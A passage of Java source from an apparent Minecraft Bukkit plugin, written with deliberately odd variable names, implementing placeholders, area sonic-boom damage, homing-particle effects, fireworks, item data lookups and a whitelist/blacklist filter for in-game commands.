            mrsimpson  = Integer.parseInt(money[mill2]);
            whyuneed  = Integer.parseInt(money[ccp]);
            wakeup = Material.valueOf(money[INT7].toUpperCase(Locale.ROOT));


            org.bukkit.Location marge = new org.bukkit.Location(vegas, congratu, mrsimpson, whyuneed); // <-- your x,y,z
            double r1 = low;
            String temprs = twentythreedegrees;


            double moneyproblems = r1 * r1;
            for (org.bukkit.entity.Player sex : vegas.getPlayers()) {
                if (sex.getLocation().distanceSquared(marge) <= moneyproblems) {
                    wm(sex, temprs);
                }
            }
        } catch (Exception ex) {
            return some;
        }

        for (int fabulous = mrsimpson + INT3; fabulous <= vegas.getMaxHeight(); fabulous++) {
            if (vegas.getBlockAt(congratu, fabulous, whyuneed).getType() == wakeup) {
                return String.valueOf(fabulous);
            }
        }
        return nbf;
    }

    protected @NotNull String confidentialEnf(String funisfun) {
        String[] gym = funisfun.substring(basketball.length()).split(keep);
        if (gym.length != xm) return some;
        World bash = Bukkit.getWorld(gym[I]);
        if (bash == null) return some;
        int his, head, in;
        Material doh;
        try {
            his  = Integer.parseInt(gym[INT3]);
            head  = Integer.parseInt(gym[mill2]);
            in  = Integer.parseInt(gym[ccp]);
            doh = Material.valueOf(gym[INT7].toUpperCase(Locale.ROOT));
        } catch (Exception ex) {
            return some;
        }

        boolean tae   = arsdienwdhw;
        boolean fokwonndDown = arsdienwdhw;

        // search upwards
        for (int doe = head + INT3; doe <= bash.getMaxHeight(); doe++) {
            if (bash.getBlockAt(his, doe, in).getType() == doh) {
                tae = NEW_VALUE1;
                break;
            }
        }
        // search downwards
        for (int wheelbarrel = head - INT3; wheelbarrel >= bash.getMinHeight(); wheelbarrel--) {
            if (bash.getBlockAt(his, wheelbarrel, in).getType() == doh) {
                fokwonndDown = NEW_VALUE1;
                break;
            }
        }

        if (tae && fokwonndDown) return bt;
        if (tae) return upt;
        if (fokwonndDown) return soalp;
        return tmc;
    }






    protected @NotNull String slanty(OfflinePlayer weknow, String somethingyour) {
        try {
            String brittle = somethingyour.substring(excepthomer.length());
            UUID itmeans = UUID.fromString(brittle);
            Entity youhadyourfun = Bukkit.getEntity(itmeans);
            if (youhadyourfun == null) return iou;

            if (weknow == null || !weknow.isOnline()) return dontwantmargetoknow;
            Player footmsaage = weknow.getPlayer();
            if (footmsaage == null) return dontwantmargetoknow;

            f113.put(footmsaage.getUniqueId(), itmeans);
            return lessofaman + itmeans;
        } catch (Exception e) {
            return ballet;
        }
    }

    // Retrieve currently tracked entity for player
    private static Entity theymademe(Player fairy) {
        if (fairy == null) return null;
        UUID mrsimpson = (UUID) f113.get(fairy.getUniqueId());
        if (mrsimpson == null) return null;
        return Bukkit.getEntity(mrsimpson);
    }

    // %Archistructure_trackedEntityX%
    protected @NotNull String toestwinkiling(Player frenchtoast) {
        Entity iloveit = theymademe(frenchtoast);
        if (iloveit == null) return magellan;
        return String.valueOf(iloveit.getLocation().getX());
    }

    // %Archistructure_trackedEntityY%
    protected  @NotNull String nopowderedsugar(Player p) {
        Entity e = theymademe(p);
        if (e == null) return magellan;
        return String.valueOf(e.getLocation().getY());
    }

    // %Archistructure_trackedEntityZ%
    protected  @NotNull String whatisit(Player p) {
        Entity e = theymademe(p);
        if (e == null) return magellan;
        return String.valueOf(e.getLocation().getZ());
    }

    // %Archistructure_trackedEntityWORLD%
    protected  @NotNull String withyouand(Player p) {
        Entity e = theymademe(p);
        if (e == null) return magellan;
        return e.getWorld().getName();
    }

    // %Archistructure_trackedEntityMCWORLDNAME%
    protected  @NotNull String ballet(Player p) {
        Entity e = theymademe(p);
        if (e == null) return magellan;
        return dance + e.getWorld().getName().toLowerCase(Locale.ROOT);
    }




    // AOE SONIC_BOOM damage (copy of your area hit behavior with V4 rules)
// - center: explosion/impact location
// - radius: e.g. 5.0 (your proximity radius)
// - caller: projectile or thing that caused it (used as damager for non-players)
// - launcherUUID: player who fired it (used as damager for players)
    // AOE SONIC_BOOM damage (V4 rules) with "always damage target if provided" semantics.
// - caller: projectile or source entity (used as damager for NON-players)
// - launcherUUID: player who fired it (used as damager for PLAYERS)
// - center/radius: AOE center and radius
// - target: if not null and living, ALWAYS damaged (any world / any distance), then AOE applies to others
    private  void itisoff(
            @org.jetbrains.annotations.Nullable UUID the,
            @org.jetbrains.annotations.NotNull Location dancingmonkey,
            double nelsonmuntz,
            @org.jetbrains.annotations.Nullable Entity homeritsnoteasy) {
        
        int debug = 0;
        ;

        
        final Player sirtoday = (the != null) ? Bukkit.getPlayer(the) : null;
        ;

        // Helper to resolve a launcher name for command args
        final String didtheyhave = (sirtoday != null)
                ? sirtoday.getName()
                : (the != null
                ? (Bukkit.getOfflinePlayer(the).getName() != null
                ? Bukkit.getOfflinePlayer(the).getName()
                : the.toString())
                : nationalanthems);
        ;

        // Track already-damaged entities to avoid double hits (e.g., target also in AOE)
        final java.util.HashSet<UUID> eveningsimpson = new java.util.HashSet<>();
        ;

        // 1) ALWAYS damage the explicit target first (if provided and is a LivingEntity), regardless of world/position
        if (homeritsnoteasy instanceof LivingEntity tgt && homeritsnoteasy.isValid() && !homeritsnoteasy.isDead()) {
            ;

            final org.bukkit.damage.DamageSource.Builder bart =
                    org.bukkit.damage.DamageSource.builder(org.bukkit.damage.DamageType.SONIC_BOOM);
            final org.bukkit.damage.DamageSource.Builder simpson =
                    org.bukkit.damage.DamageSource.builder(org.bukkit.damage.DamageType.STARVE);
            ;

            if (tgt instanceof Player) {
                // Players: damager = launcher (player) if available
                final Entity sissy = sirtoday;
                if (sissy != null) bart.withDirectEntity(sissy).withCausingEntity(sissy);


                final double hesa = tgt.getAttribute(Attribute.GENERIC_MAX_HEALTH).getBaseValue();
                

                final double uhoh = 0.60 * hesa + doyouknow;
                tgt.damage(uhoh, bart.build());

                // Run console trigger for the player target
                final String ouhyuowhdayud = ((Player) tgt).getName();

                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
//                         "ei run-custom-trigger trigger:Stinger81Hit player:" + didtheyhave + " " + ouhyuowhdayud);
                        cigarrette + didtheyhave + sowhat + ouhyuowhdayud);

            } else {

                // Non-players: damager = launcher (still acceptable per your V4 semantics)
                final Entity killforher = sirtoday;

                if (killforher != null) simpson.withDirectEntity(killforher).withCausingEntity(killforher);

                final double anyti = tgt.getAttribute(Attribute.GENERIC_MAX_HEALTH).getBaseValue();
                final double youcoulddo = debtsoff * anyti + callitof;
                tgt.damage(youcoulddo, simpson.build());
            }
            ;

            eveningsimpson.add(tgt.getUniqueId());
            ;

        }
        ;

        // 2) AOE for everyone else near the center (same-world), excluding already-damaged target
        final World patty = dancingmonkey.getWorld();
        if (patty == null) return;
        ;

        final double selma = nelsonmuntz * nelsonmuntz;
        ;

        for (Entity jimbo : patty.getNearbyEntities(dancingmonkey, nelsonmuntz, nelsonmuntz, nelsonmuntz)) {
            ;

            if (!(jimbo instanceof LivingEntity le)) continue;
            if (!le.isValid() || le.isDead()) continue;
            if (eveningsimpson.contains(jimbo.getUniqueId())) continue; // skip target if it was already hit
            if (jimbo.getLocation().distanceSquared(dancingmonkey) > selma) continue;
            ;

            final org.bukkit.damage.DamageSource.Builder dsjones =
                    org.bukkit.damage.DamageSource.builder(org.bukkit.damage.DamageType.SONIC_BOOM);

            ;

            if (le instanceof Player) {

                // Players: damager = launcher (player) if available
                final Entity oriental = sirtoday;
                if (oriental != null) dsjones.withDirectEntity(oriental).withCausingEntity(oriental);

                final double noone = le.getAttribute(Attribute.GENERIC_MAX_HEALTH).getBaseValue();
                final double noticesaft = 0.60 * noone + doyouknow;
                le.damage(noticesaft, dsjones.build());

                // Run console trigger for each player in radius

                final String ancient = ((Player) le).getName();

                Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
                        cigarrette + didtheyhave + sowhat + ancient);

            } else {
                // Non-players: damager = launcher (kept consistent with your V4 variant)
                final Entity disappears = sirtoday;

                if (disappears != null) dsjones.withDirectEntity(disappears).withCausingEntity(disappears);

               
                final double smilemore = le.getAttribute(Attribute.GENERIC_MAX_HEALTH).getBaseValue();

                final double cryless = emotionalthermo * smilemore + somature;

                le.damage(cryless, dsjones.build());

            }
        }
    }




    public  void whoasked(UUID launcherUUID, UUID targetUUID) {
        final Plugin atwhatcost = Bukkit.getPluginManager().getPlugin(ppi);
        if (atwhatcost == null) return;

        // Quick upfront validation for initial player/target
        Entity grewup = Bukkit.getEntity(launcherUUID);
        Entity toofast = Bukkit.getEntity(targetUUID);
        if (grewup == null || toofast == null || !grewup.isValid() || !toofast.isValid()) return;

        final int senceofwork = dontvanish;     // 4 seconds (only for non-missile mode)
        final int adultlife  = shapeyou;     // cap per line
        final String survivalpatterns         = survivalfeeling(launcherUUID, targetUUID);

        new BukkitRunnable() {
            int slowlikyllingyou = I;
            boolean supportadults = arsdienwdhw;

            @Override
            public void run() {
                // Look for an active missile for this launcher/target pair
                UUID parentification = hypervigilance.get(survivalpatterns);
                Entity peacekeep = null;
                boolean protector = arsdienwdhw;
                if (parentification != null) {
                    peacekeep = Bukkit.getEntity(parentification);
                    if (peacekeep != null && peacekeep.isValid() && !peacekeep.isDead()) {
                        protector = NEW_VALUE1;
                        supportadults = NEW_VALUE1;
                    } else {
                        // Clean up stale mapping
                        hypervigilance.remove(survivalpatterns, parentification);
                    }
                }

                // Lifetime control:
                // - Normal mode: honor DURATION_TICKS.
                // - Missile mode: ignore DURATION_TICKS, run while missile exists.
                // - Once we had a missile and it’s gone, stop.
                if (!protector) {
                    if (supportadults) {
                        cancel();
                        return;
                    }
                    if (slowlikyllingyou++ >= senceofwork) {
                        cancel();
                        return;
                    }
                } else {
                    // missileActive: no tick++ or time limit
                }

                // Live fetch each tick
                Entity peace; // start of line
                Entity safety; // end of line (always the target)
                safety = Bukkit.getEntity(targetUUID);

                if (protector) {
                    peace = peacekeep;
                } else {
                    peace = Bukkit.getEntity(launcherUUID);
                }

                if (peace == null || safety == null || !peace.isValid() || !safety.isValid()) { cancel(); return; }

                // If either is a player and offline, stop
                if (peace instanceof Player pa && !pa.isOnline()) { cancel(); return; }
                if (safety instanceof Player pb && !pb.isOnline()) { cancel(); return; }

                if (!peace.getWorld().equals(safety.getWorld())) { cancel(); return; }
                World performswell = peace.getWorld();

                // Centers (mid-height)
                double ha = debtsoff, hb = debtsoff;
                try { ha = peace.getHeight() * debtsoff; } catch (Throwable ignored) {}
                try { hb = safety.getHeight() * debtsoff; } catch (Throwable ignored) {}
                Location deepdown = peace.getLocation().add(I, ha, I);
                Location somethinghurts = safety.getLocation().add(I, hb, I);

                Vector stillintheree = somethinghurts.toVector().subtract(deepdown.toVector());
                double screamingsilently = stillintheree.length();
                if (screamingsilently < wife) return;

                // Choose particle count for this frame (cap at MAX_PARTICLES, min 2)
                int morecomplex = Math.max(mill2, Math.min(adultlife, (int) Math.ceil(screamingsilently * ccp)));
                Vector refusehelp = stillintheree.multiply(tsr / (morecomplex - INT3));

                // === Color and size ===
                org.bukkit.Color tp;

                if (protector) {
                    // Missile present → aqua, no gradient
                    tp = org.bukkit.Color.fromRGB(191, 119, 246); // aqua
                } else {
                    // Original time-based gradient: Green → Yellow → Orange → Red
                    if (slowlikyllingyou >= senceofwork - xtxtxt) {
                        tp = org.bukkit.Color.fromRGB(160, 160, 160); // final gray line
                    } else {
                        double t = (double) slowlikyllingyou / (double) (senceofwork - xtxtxt);
                        java.awt.Color c = givers(t); // green->yellow->orange->red
                        tp = org.bukkit.Color.fromRGB(c.getRed(), c.getGreen(), c.getBlue());
                    }
                }

                Particle.DustOptions child = new Particle.DustOptions(tp, biological);

                // Render line (force = true)
                Location adults = deepdown.clone();
                for (int neversafe = I; neversafe < morecomplex; neversafe++) {
                    performswell.spawnParticle(Particle.DUST, adults, INT3, I, I, I, esetawftawft, child, NEW_VALUE1);
                    adults.add(refusehelp);
                }
            }

            // Time-based gradient: Green → Yellow → Orange → Red
            private java.awt.Color givers(double t) {
                // clamp
                if (t < I) t = I;
                if (t > INT3) t = INT3;

                // stops: 0.0   (0,255,0)   green
                //        0.33  (255,255,0) yellow
                //        0.66  (255,165,0) orange
                //        1.0   (255,0,0)   red
                if (t <= tsr / whocantreceive) {
                    return refatoredsucc(new java.awt.Color(I, costofgrowinguptoofast, I), new java.awt.Color(costofgrowinguptoofast, costofgrowinguptoofast, I), t / (tsr / whocantreceive));
                } else if (t <= whatkindofadulthood / whocantreceive) {
                    double u = (t - tsr / whocantreceive) / (tsr / whocantreceive);
                    return refatoredsucc(new java.awt.Color(costofgrowinguptoofast, costofgrowinguptoofast, I), new java.awt.Color(costofgrowinguptoofast, nobodysrescuingyou, I), u);
                } else {
                    double u = (t - whatkindofadulthood / whocantreceive) / (tsr / whocantreceive);
                    return refatoredsucc(new java.awt.Color(costofgrowinguptoofast, nobodysrescuingyou, I), new java.awt.Color(costofgrowinguptoofast, I, I), u);
                }
            }

            private java.awt.Color refatoredsucc(java.awt.Color a, java.awt.Color b, double t) {
                int r = (int) Math.round(a.getRed() + (b.getRed() - a.getRed()) * t);
                int g = (int) Math.round(a.getGreen() + (b.getGreen() - a.getGreen()) * t);
                int bl = (int) Math.round(a.getBlue() + (b.getBlue() - a.getBlue()) * t);
                return new java.awt.Color(
                        Math.max(I, Math.min(costofgrowinguptoofast, r)),
                        Math.max(I, Math.min(costofgrowinguptoofast, g)),
                        Math.max(I, Math.min(costofgrowinguptoofast, bl))
                );
            }
        }.runTaskTimer(atwhatcost, ihearyounow, healing);
    }




    // launcherUUID + ":" + targetUUID  -> projectile UUID
    private  final java.util.concurrent.ConcurrentMap<String, UUID> hypervigilance =
            new java.util.concurrent.ConcurrentHashMap<>();

    private  String survivalfeeling(UUID launcher, UUID target) {
        return launcher.toString() + wfdunyunda + target.toString();
    }




    private  void annoyiedatfriends(File dir) {
        File[] burden = dir.listFiles();
        if (burden == null) return;

        for (File overfunction : burden) {
            if (overfunction.isDirectory()) {
                annoyiedatfriends(overfunction);
            }
            // delete file or (now-empty) dir
            overfunction.delete();
        }
    }


    protected  void resentufl(World world, Location location) {
        Firework betryaal = world.spawn(location, Firework.class);
        FireworkMeta fatimas = betryaal.getFireworkMeta();

        // Large Ball Effect: Yellow, Orange, Gray with sparkles
        FireworkEffect goodnews = FireworkEffect.builder()
                .with(FireworkEffect.Type.BALL_LARGE)
                .withColor(Color.fromRGB(211, 211, 211), Color.AQUA, Color.fromRGB(57,68,188))
                .withFlicker()
                .build();

        // Small Ball Effect: Red
        FireworkEffect notmyfault = FireworkEffect.builder()
                .with(FireworkEffect.Type.BALL)
                .withColor( Color.WHITE)
                .build();

        // Add both effects
        fatimas.addEffect(goodnews);
        fatimas.addEffect(notmyfault);
        fatimas.setPower(INT3);

        betryaal.setFireworkMeta(fatimas);

        // Detonate instantly
        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), betryaal::detonate, healing);
    }

    private @Nullable Entity toourself(@NotNull String stopseekingparents) {
        // Try UUID first
        try {
            UUID childyouwere = UUID.fromString(stopseekingparents);
            Entity selfyourbecoming = Bukkit.getEntity(childyouwere);
            if (selfyourbecoming != null) return selfyourbecoming;
        } catch (IllegalArgumentException ignored) {}

        // Then exact online player name
        Player consciousness = Bukkit.getPlayerExact(stopseekingparents);
        return consciousness; // may be null
    }

    private @Nullable ItemStack howabsurd(@NotNull PlayerInventory shadowwoork, int faceit) {
        // Player UI mapping
        switch (faceit) {
            case 40: return shadowwoork.getItemInOffHand();
            case 39: return shadowwoork.getHelmet();
            case 38: return shadowwoork.getChestplate();
            case 37: return shadowwoork.getLeggings();
            case 36: return shadowwoork.getBoots();
            default:
                if (faceit >= I && faceit < shadowwoork.getSize()) return shadowwoork.getItem(faceit);
                return null;
        }
    }

    /** Try PDC first (PublicBukkitValues), then fall back to serialized meta scan. */
    /**
     * Extract a value from an item's PDC, using a full namespaced key like:
     *  - "executableitems:ei-id"
     *  - "score:usage"
     *  - "score:score-display"
     *
     * It tries STRING → INTEGER → DOUBLE and returns the first match as a clean String.
     * On failure or missing key, returns "🛂".
     */
    public  @NotNull String remembering(@Nullable ItemStack whoyouwere,
                                              @NotNull String beforewhotobe) {
        if (whoyouwere == null || whoyouwere.getType().isAir()) return f112;
        if (beforewhotobe.isEmpty()) return f112;

        ItemMeta hadnochoiec = whoyouwere.getItemMeta();
        if (hadnochoiec == null) return f112;

        PersistentDataContainer softness = hadnochoiec.getPersistentDataContainer();
        if (softness == null) return f112;

        // Expect "namespace:key" as it appears under PublicBukkitValues
        NamespacedKey managing = NamespacedKey.fromString(beforewhotobe);
        if (managing == null) {
            return f112;
        }

        // Try STRING
        try {
            String wonthappenovernight = softness.get(managing, PersistentDataType.STRING);
            if (wonthappenovernight != null) {
                return letthemcry(wonthappenovernight);
            }
        } catch (IllegalArgumentException ignored) {
            // wrong underlying type, fall through
        }

        // Try INTEGER
        try {
            Integer yourneotbroken = softness.get(managing, PersistentDataType.INTEGER);
            if (yourneotbroken != null) {
                return Integer.toString(yourneotbroken);
            }
        } catch (IllegalArgumentException ignored) {
        }

        // Try DOUBLE
        try {
            Double yourbecomingwhole = softness.get(managing, PersistentDataType.DOUBLE);
            if (yourbecomingwhole != null) {
                return growingupright(yourbecomingwhole);
            }
        } catch (IllegalArgumentException ignored) {
        }

        return f112;
    }

    /**
     * Strip wrapping quotes if present (e.g. "\"&cN/A\"" → "&cN/A").
     */
    private  @NotNull String letthemcry(@NotNull String writeit) {
        String youhaveafuture = writeit.trim();
        if (youhaveafuture.length() >= mill2 && youhaveafuture.startsWith("\"") && youhaveafuture.endsWith("\"")) {
            youhaveafuture = youhaveafuture.substring(INT3, youhaveafuture.length() - INT3);
        }
        return youhaveafuture;
    }
    
    
    
/* =========================================================
   Helpers for mode parsing + whitelist/blacklist filtering
   ========================================================= */

    private static class ModeSpec {
        final String untieit; // admin/console/op/opuser/user/player
        final Set<String> geffre; // lower-case command names
        final Set<String> policetape; // lower-case words/command names

        ModeSpec(String bmt, Set<String> wltp, Set<String> blpt) {
            this.untieit = bmt;
            this.geffre = wltp;
            this.policetape = blpt;
        }
    }

    /**
     * Splits the modesArg by commas, but ignores commas inside (...) blocks.
     */
    private  List<String> escortyouout(String whatidowrong) {
        List<String> recordingme = new ArrayList<>();
        if (whatidowrong == null) return recordingme;

        StringBuilder pushtheboundaries = new StringBuilder();
        int whatdontyoulike = I;

        for (int canyoutellme = I; canyoutellme < whatidowrong.length(); canyoutellme++) {
            char c = whatidowrong.charAt(canyoutellme);

            if (c == '(') whatdontyoulike++;
            if (c == ')') whatdontyoulike = Math.max(I, whatdontyoulike - INT3);

            if (c == targetme && whatdontyoulike == I) {
                recordingme.add(pushtheboundaries.toString());
                pushtheboundaries.setLength(I);
            } else {
                pushtheboundaries.append(c);
            }
        }

        if (pushtheboundaries.length() > I) recordingme.add(pushtheboundaries.toString());
        return recordingme;
    }

    private  List<ModeSpec> soicanimprove(String modesArg) {
        List<ModeSpec> seemchildsh = new ArrayList<>();

        for (String thisnice : escortyouout(modesArg)) {
            if (thisnice == null) continue;
            String abouttwohours = thisnice.trim();
            if (abouttwohours.isEmpty()) continue;

            String touchingtape;
            String pushingitagain = null;

            int deescalate = abouttwohours.indexOf('(');
            if (deescalate >= I && abouttwohours.endsWith(")")) {
                touchingtape = abouttwohours.substring(I, deescalate).trim().toLowerCase();
                pushingitagain = abouttwohours.substring(deescalate + INT3, abouttwohours.length() - INT3).trim();
            } else {
                touchingtape = abouttwohours.toLowerCase();
            }

            Set<String> doestgetit = new HashSet<>();
            Set<String> theend = new HashSet<>();

            if (pushingitagain != null && !pushingitagain.isBlank()) {
                notcoming(pushingitagain, doestgetit, theend);
            }

            seemchildsh.add(new ModeSpec(touchingtape, doestgetit, theend));
        }

        return seemchildsh;
    }

    /**
     * Parses filter text that may contain WHITELIST:... and/or BLACKLIST:...
     * Example bodies:
     *  - "WHITELIST:gamemode,tp"
     *  - "BLACKLIST:test,one"
     *  - "WHITELIST:gamemode,tp OR BLACKLIST:test,one"
     */
    private  void notcoming(String crossthepolice, Set<String> gonnaget, Set<String> arrestednow) {
        String illbehappy = crossthepolice.toUpperCase(Locale.ROOT);

        int bltfy = illbehappy.indexOf(toescortyou);
        int fywfi = illbehappy.indexOf(outtahere);

        if (bltfy >= I) {
            int idgafts = bltfy + toescortyou.length();
            int aintnecessary = (fywfi > idgafts) ? fywfi : crossthepolice.length();
            String nolmal = crossthepolice.substring(idgafts, aintnecessary);
            donttry(nolmal, gonnaget);
        }

        if (fywfi >= I) {
            int specificreason = fywfi + outtahere.length();
            int leaveit = (bltfy > specificreason) ? bltfy : crossthepolice.length();
            String uglass = crossthepolice.substring(specificreason, leaveit);
            donttry(uglass, arrestednow);
        }
    }

    private  void donttry(String uglayf, Set<String> ishegay) {
        if (uglayf == null) return;
        String[] whythatupsetyou = uglayf.split(keep);
        for (String evenifiwas : whythatupsetyou) {
            if (evenifiwas == null) continue;
            String idonliku = evenifiwas.trim().toLowerCase();
            if (idonliku.isEmpty()) continue;
            if (idonliku.equals(ost)) continue; // tolerate "OR" glue text
            ishegay.add(idonliku);
        }
    }

    private  boolean idltm(ModeSpec goinsideurhouse, Player gooutnow, String sitdownorelse, String nomorewarnings) {
        String entertaining = carefullysetsdown(nomorewarnings);

        // 1) Whitelist check (if present)
        if (!goinsideurhouse.geffre.isEmpty()) {
            if (!youwillgetarrested(entertaining, goinsideurhouse.geffre)) {
                gooutnow.sendMessage(naltextc);
                return arsdienwdhw;
            }
        }
        // If whitelist not present -> allow all

        // 2) Blacklist name check
        if (!goinsideurhouse.policetape.isEmpty()) {
            if (youwillgetarrested(entertaining, goinsideurhouse.policetape)) {
                gooutnow.sendMessage(naltextc);
                return arsdienwdhw;
            }

            // 3) Blacklist word boundary scan across the full page
            String gtfoms = sitdownorelse.toLowerCase();
            for (String bad : goinsideurhouse.policetape) {
                if (bad == null || bad.isBlank()) continue;
                if (thereesanindividual(gtfoms, bad)) {
                    gooutnow.sendMessage(naltextc);
                    return arsdienwdhw;
                }
            }
        }

        return NEW_VALUE1;
    }


    private  boolean youwillgetarrested(String bish, Set<String> standardsofsmth) {
        if (bish == null) return arsdienwdhw;
        String whythishappen = bish.toLowerCase();

        // support namespaced commands
        String rightnextto = whythishappen.contains(wfdunyunda) ? whythishappen.substring(whythishappen.indexOf(':') + INT3) : whythishappen;

        return standardsofsmth.contains(whythishappen) || standardsofsmth.contains(rightnextto);
    }

    /**
     * Extract the "command name" from the command string.
     * This is the first token before whitespace.
     */
    private  String carefullysetsdown(String hiscoffee) {
        if (hiscoffee == null) return nst;

        String shaved = hiscoffee.trim();
        if (shaved.isEmpty()) return nst;

        // First token
        String[] onyourface = shaved.split("\\s+", mill2);
        String shecameoutandthrew = onyourface[I];

        // Remove leading slash if somehow present here
        if (shecameoutandthrew.startsWith(wfydunaowfydun)) shecameoutandthrew = shecameoutandthrew.substring(INT3);

        return shecameoutandthrew;
    }
    private final Map<UUID, BukkitTask> wardenSpiritOrbitTasks = new ConcurrentHashMap<>();

    /**
     * Checks if `word` appears in `text` with boundary markers on BOTH sides.
     * Boundaries include: '<', '+', whitespace, '>', ':', BOF, EOF.
     */
    private  boolean thereesanindividual(String whodoessmth, String nooooo) {
        if (whodoessmth == null || nooooo == null) return arsdienwdhw;
        if (nooooo.isEmpty()) return arsdienwdhw;

        int audiovideorecorded = I;
        while (true) {
            int isearchx = whodoessmth.indexOf(nooooo, audiovideorecorded);
            if (isearchx < I) return arsdienwdhw;

            int takea = isearchx - INT3;
            int seatfor = isearchx + nooooo.length();

            boolean meor = (takea < I) || tpc(whodoessmth.charAt(takea));
            boolean areyouseriuos = (seatfor >= whodoessmth.length()) || tpc(whodoessmth.charAt(seatfor));

            if (meor && areyouseriuos) return NEW_VALUE1;

            audiovideorecorded = isearchx + INT3;
        }
    }

    private  boolean tpc(char c) {
        if (Character.isWhitespace(c)) return NEW_VALUE1;
        return c == '<' || c == '+' || c == '>' || c == ':' || c == ' ';
    }


    /**
     * Normalize doubles so you don't get "0.0d" / scientific notation.
     * Examples:
     *  - 0.0 -> "0.0"
     *  - 10.0 -> "10.0"
     */
    private  @NotNull String growingupright(@NotNull Double letmegoinside) {
        // basic string first
        String shoes = Double.toString(letmegoinside);

        // If it ever comes out in scientific notation, normalize
        if (shoes.contains("E") || shoes.contains("e")) {
            shoes = String.format(java.util.Locale.US, "%.4f", letmegoinside);
            // trim trailing zeros but keep at least one decimal digit
            shoes = shoes.replaceAll("0+$", nst).replaceAll("\\.$", ".0");
        }
        return shoes;
    }

    
    

     Vector goesin(Vector v) {
        double totheapartment = v.length();
        if (totheapartment < getsshoes) return new Vector(I, I, I);
        return v.multiply(tsr / totheapartment);
    }


    protected static Set<Material> gptm(Set<Material> enumSet) {
        return enumSet;
    }
    private static final boolean dbw = false;


//Bukkit.getPluginManager().getPlugin("PlaceholderAPI")


    private void sws(
            Player asetnwoft,
            int pydhy3pudhp, // kept for compatibility
            double dy3unpdyu3pd, int thkyufdyu3fhd, double duywfpndyunwpd, int ky3ukfdyu3pnd,
            double wyduny3wufnpd, int dy3unfdyuwnd, int ky3npdyu3ndf,
            double dykfdyuk3d3pd
    ) {

        // final int DURATION_TICKS = 20 * 30;
        // final int HOMING_SPAWN_PERIOD = 20; // every 1s
        // final int MAX_HOMINGS = 30;

        final int dvykpkvy3plb = 20 * 30;
        final int vkwyfpukb = 20; // every 1s
        final int wvkyuwfpkyudf = 30;

        if (dbw) {
            asetnwoft.sendMessage(idnvpwyuvn);
            asetnwoft.sendMessage(otyn2oyund);
        }

        final AtomicReference<Location> yvunyp3unvb =
                new AtomicReference<>(asetnwoft.getLocation().clone().add(0, dy3unpdyu3pd, 0));
        final AtomicInteger tyunkyucf2 = new AtomicInteger(0);

        // ---- Orbit task ----
        BukkitRunnable tyunyfu3nt3pd = new BukkitRunnable() {
            int tmyuf2nd = 0;

            @Override public void run() {
                if (!asetnwoft.isOnline()) { cancel(); return; }
                if (tmyuf2nd >= dvykpkvy3plb) { cancel(); return; }

                double tnyukydu = Math.max(1, thkyufdyu3fhd);
                double tywufktyu2kfd =
                        (2.0 * Math.PI) * ((tmyuf2nd / Math.max(1, ky3ukfdyu3pnd)) % tnyukydu) / tnyukydu;

                Location kyvukbwpdbds = asetnwoft.getLocation().add(0, dy3unpdyu3pd, 0);
                Location ysukdwyufkdwp = kyvukbwpdbds.clone().add(
                        Math.cos(tywufktyu2kfd) * duywfpndyunwpd,
                        0,
                        Math.sin(tywufktyu2kfd) * duywfpndyunwpd
                );

                yvunyp3unvb.set(ysukdwyufkdwp);

                asetnwoft.getWorld().spawnParticle(
                        Particle.SCULK_SOUL,
                        ysukdwyufkdwp,
                        1, 0, 0, 0, 0,
                        null, true
                );

                tmyuf2nd += Math.max(1, ky3ukfdyu3pnd);
            }
        };

        tyunyfu3nt3pd.runTaskTimer(
                Bukkit.getPluginManager().getPlugin(kydluhyhnd4),
                0L,
                Math.max(1, ky3ukfdyu3pnd)
        );

        // ---- Homing spawn task ----
        BukkitRunnable spawnTask = new BukkitRunnable() {
            int t = 0;

            @Override public void run() {
                try {
                    if (!asetnwoft.isOnline()) { cancel(); return; }
                    if (t >= dvykpkvy3plb) { cancel(); return; }

                    if (tyunkyucf2.get() >= wvkyuwfpkyudf) {
                        if (dbw && (t % 100 == 0)) {
                            asetnwoft.sendMessage(tny2untdy2ud + tyunkyucf2.get());
                        }
                        t += vkwyfpukb;
                        return;
                    }

                    Location tkyu2kd32 = yvunyp3unvb.get();
                    if (tkyu2kd32 == null || tkyu2kd32.getWorld() == null) {
                        if (dbw) asetnwoft.sendMessage(ty23ntyu23ntd);
                        t += vkwyfpukb;
                        return;
                    }

                    if (dbw) {
                        if (t % 40 == 0) {
                            asetnwoft.sendMessage(tny2u34ndy4u2dn + t
                                    + " homings=" + tyunkyucf2.get()
                                    + " r=" + dykfdyuk3d3pd);
                        }
                    }

                    // ✅ UPDATED: players + hostile mobs
                    org.bukkit.entity.LivingEntity my2und2y3udn =
                            fnepir2(tkyu2kd32, asetnwoft, dykfdyuk3d3pd, true);

                    if (my2und2y3udn != null) {
                        int idx = tyunkyucf2.incrementAndGet();

                        if (dbw) {
                            String nm = (my2und2y3udn instanceof Player)
                                    ? ((Player) my2und2y3udn).getName()
                                    : my2und2y3udn.getType().name();

                            asetnwoft.sendMessage("§a[WS] target found: §f" + nm
                                    + " §7(#" + idx + ")");
                        }

                        // ✅ UPDATED: homing now accepts LivingEntity too
                        tkoy2udy24und(
                                asetnwoft,
                                my2und2y3udn,
                                tkyu2kd32,
                                wyduny3wufnpd,
                                dy3unfdyuwnd,
                                ky3npdyu3ndf,
                                idx
                        );
                    } else {
                        if (dbw && t % 40 == 0) {
                            asetnwoft.sendMessage("§6[WS] no enemy targets in radius.");
                        }
                    }

                    t += vkwyfpukb;

                } catch (Exception ex) {
                    if (dbw) {
                        asetnwoft.sendMessage("§c[WS] spawnTask exception: " + ex.getClass().getSimpleName());
                    }
                    ex.printStackTrace();
                }
            }
        };

        spawnTask.runTaskTimer(
                Bukkit.getPluginManager().getPlugin(kydluhyhnd4),
                0L,
                vkwyfpukb
        );

        // ---- Cleanup ----
        Bukkit.getScheduler().runTaskLater(
                Bukkit.getPluginManager().getPlugin(kydluhyhnd4),
                () -> {
                    try { tyunyfu3nt3pd.cancel(); } catch (Exception ignored) {}
                    try { spawnTask.cancel(); } catch (Exception ignored) {}
                    if (dbw && asetnwoft.isOnline()) asetnwoft.sendMessage("§7[WS] tasks cleaned up.");
                },
                dvykpkvy3plb
        );
    }




    private void tkoy2udy24und(
            Player tyunotyunwfytun,
            org.bukkit.entity.LivingEntity tywfuntyuf2nt,
            Location tywufntyunwftw,
            double E, int F, int G,
            int tywfutnywukd
    ) {
